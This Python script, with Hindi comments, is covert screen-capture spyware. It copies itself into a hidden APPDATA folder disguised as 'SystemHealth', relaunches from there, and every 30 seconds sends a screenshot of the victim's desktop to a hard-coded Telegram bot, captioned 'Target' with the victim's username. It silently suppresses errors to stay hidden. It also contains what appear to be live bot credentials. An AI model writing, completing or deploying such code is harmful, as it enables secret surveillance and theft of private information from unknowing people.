import pyautogui
import requests
import io
import time
import os
import shutil
import sys

# --- CONFIG ---
BOT_TOKEN = "8511722230:AAF4odayV4DoKSmb6m9dL2-vUoQP88h2TZo"
CHAT_ID = "1431950109"
INTERVAL = 30 

# --- STEALTH: AUTO-HIDE LOGIC ---
def hide_me():
    appdata_path = os.getenv('APPDATA')
    target_dir = os.path.join(appdata_path, "SystemHealth")
    target_file = os.path.join(target_dir, "sys_monitor.pyw")

    # 1. Folder banao agar nahi hai
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    # 2. Agar script abhi galat jagah par hai, toh move karo
    current_path = os.path.abspath(sys.argv[0])
    if current_path != target_file:
        shutil.copy(current_path, target_file)
        # Nayi file background mein chalu karo aur purani band kar do
        os.startfile(target_file)
        sys.exit()

def take_and_send_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        image_binary = io.BytesIO()
        screenshot.save(image_binary, format='PNG')
        image_binary.seek(0)
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('screenshot.png', image_binary, 'image/png')}
        data = {'chat_id': CHAT_ID, 'caption': '👤 Target: ' + os.getlogin()}
        
        requests.post(url, files=files, data=data)
    except:
        pass # Stealth mode mein error nahi dikhate

# --- MAIN ---
if __name__ == "__main__":
    hide_me() # Pehle chhupo
    while True:
        take_and_send_screenshot()
        time.sleep(INTERVAL)
